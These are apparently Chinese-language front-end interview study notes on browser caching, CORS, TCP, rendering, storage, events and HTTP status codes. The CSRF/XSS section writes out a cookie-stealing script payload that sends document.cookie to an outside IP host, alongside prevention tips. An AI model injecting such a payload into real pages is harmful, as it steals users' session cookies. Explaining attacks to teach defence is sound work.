# 浏览器

### 问题一 ：前端性能优化 

#### 浏览器缓存
    合理运用浏览器缓存可以减少服务器压力，提高网页响应速度,浏览器会根据响应header里的缓存相关字段来设置缓存，浏览器缓存分为强缓存和协商缓存，优先强缓存
    强缓存:强制使用缓存 通过响应头 Cache-Control：（private,public,no-cache,mag-age=0,no-store）字段控制  如果传了no-cache 证明需要使用协商缓存
    协商缓存:每次使用前需要和服务器协商一下是否使用缓存，服务器通过响应头（Etag：1）决定是否应用协商缓存， (以后每次请求 都会在头里带上If-None-Match:1) 
    如果返回304 继续使用缓存，如果服务器数据已更新（修改Etag值），重新返回200 和新的responseBody数据 替换缓存. 
#### 图片
    使用精灵图 减少图片资源，可以使用图片懒加载
#### 压缩
    使用gzip压缩服务返回的数据 请求头设置（Accept-Encoding: GZIP, Deflate） 服务器 设置响应头Content-Encoding: GZIP

### 问题二 ：对跨域的理解和解决
    浏览器出于安全考虑，一个源的网站不允许与另一个源的网站交互，同源即 协议 主机 端口都相同 执行脚本的时候会检测是否同源ajax不同源的会被拦截
    跨域资源嵌入是可以的  <img> <script> <link> <iframe>

    1.通过后台响应头设置允许跨域 
    2.通过nginx 监听同一端口  通过/api 路径来区分不同服务的访问

### 问题三 ：csrf和xss攻击理解和预防
    csrf 利用浏览器信任 统一domain下的请求，会携带cookie  a打开银行网站,登录后没关闭此窗口，然后打开了含有攻击性的网站,网站内有<img src='http://转账代码'> 头中会携带cookie
    预防 ：1.数据安全性高高的避免使用 get请求 ，2.用token认证  3.对接口加验证码校验
    xss 嵌入恶意的js代码然后获取用户cookie  比如博客评论 在内容里嵌入<script>window.open('http://10.65.20.196:8080/cookie.asp?msg='+document.cookie)</script> 我的服务就拿到了cookie
    预防：1.过滤特殊字符  2. 将`cookie`设置为`http-only`,`js`脚本将无法读取到`cookie`信息。

### 问题四 tcp 连接的三次握手为什么不能改成2次
    考虑到client A 请求与服务B建立连接,由于网络原因这次报文一定时间内没到达B ，A又发起了一次连接现在开始传数据没传完后关闭，一开始那次请求，到达了B ,B现在发送确认请求，
    然后一直等着A 来发送数据，A本身已经不想发送数据了，这样造成了服务资源浪费。
### 问题五 简述tcp连接3次握手过程
    第一次握手，客户端主动连接服务器，发送初始序列号'seq =x','SYN = 1'同步标志 进入SYN_SEND同步发送状态
    第二次握手，服务器收到消息后 发送确认同步标志 'SYN=1'和确认标志'ACK=1',并发送自己的序列号'seq=y'和客户端确认序列'ack=x+1' 进入同步接收'SYNC_RECV'状态
    第三次握手，客户端接收后 发送确认标志 'ACK=1'和自己的序列号'seq=x+1'与服务器确认号'ack=y+1'进入建立连接状态，服务器收到后也进入连接状态 
### 问题五 简述tcp和udp的区别
   TCP：                                                                        UDP：
   面向连接，可以传输相对较大数据                                                  无连接，可以传输的数据相对较小
   使用流量控制，拥塞控制保证可靠                                                  不使用流量控制和拥塞控制，尽最大努力交付
   保证传输顺序                                                                   不保证传输顺序
   提供校验和，确认应答，流量控制，拥塞控制 超时重传，序列号，连接管理       
   适用于可靠传输，文件传输                                                        应用于直播，网络电话，视频会议 
### 问题六 简述tcp粘包解决方案
   粘包 服务端会将间隔时间较小连续发送的包粘起来组成一个大包 
   解决：将每次传输的消息分为消息头和消息体，消息头包含这次传输的总长度，服务端解析

### 问题七 浏览器渲染过程
   自上而下先解析<html>形成'DOM Tree'
   如果解析到<Link><Style>解析css 形成'CSS Tree' html和css解析开始并行解析
   遇到<Script>停止文档解析 开始解析js 
   'Dom Tree 和CSS Tree'生成后，将两者结合布局，计算大小位置等,生成'render Tree'
   根据计算好的信息，调用paint ，将内容显示在屏幕上
### 问题八 重绘 回流
   重绘：'render tree'中一些影响外观，但是不影响布局的属性改变，比如bgc-color，整棵树不需要重新构建
   回流： 布局，元素尺寸大小改变，需要重新绘制整棵树，就是回流，页面第一次加载就是回流
### 常见的兼容性问题
   浏览器由于版本不同，内核不同，导致最后渲染出来的的结果有不同，通常使用normalize抹平样试差异 
   默认边距也可能不同
   ie4-8 不支持css3 opacity属性，可以通过css filter来设置
   ie4-8 不支持媒体查询，不支持html5新标签 
   ie4-8 window.event.returnValue =false 阻止默认行为      window.event.cancelBubble = true 防止事件冒泡
   webkit内核 event.preventDefault()                      event.stopPropagation()
### 浏览器默认行为（直接在处理函数中加return false也会阻止默认行为）
    <a href="">会默认跳转地址 通过监听事件 阻止默认行为 就不能跳转了
    <input> 获得焦点后 敲击键盘会自动输入 阻止后 键盘输入无效
    type为submit的input 或者<button>都会触发表达提交，阻止后不提交
### 浏览器本地存储 
    localStorage 存储大约5m大小 永久存储除非删掉
    sessionStorage 存储大约5m大小 关闭浏览器就是失效
    cookie 存储大约4k 不设置过期时间的话 关闭浏览器会失效
    session 存储在服务端 通过服务器设置 一般会以键值对存储在cookie中
    下次请求浏览器会自动带上sessionid去服务器，服务器自动解析sessionid，
    获取session 通过session获取session存储的信息
### 事件委托机制
    由于事件默认是向上冒泡的，操作子盒子的事件可以写在父盒子上，让父盒子去执行
    比如ul 下面多个li 不需要给每个li都设置点击事件，父盒子设置设置点击事件，
    点击子盒子也可以拿到子盒子的标签。
### http状态码
    200 ok
    204 ok 无内容返回
    301：永久重定向；
    302：临时移动，可使用原有URI；
    304：资源未修改，可使用缓存；
    400 服务器无法解析客户端请求
    401 需要请求身份认证
    403 服务器拒绝执行此请求
    404 服务器找不到客户请求资源
    500 服务器内部错误
    502 网关出问题
    503 服务器挂了

### 浏览器 history对象的方法和属性
    length      返回浏览器历史列表中的URL数量
    back()      加载 history 列表中的前一个URL
    forward() 加载 history 列表中的下一个URL
    go()         加载history列表中的某个具体页面。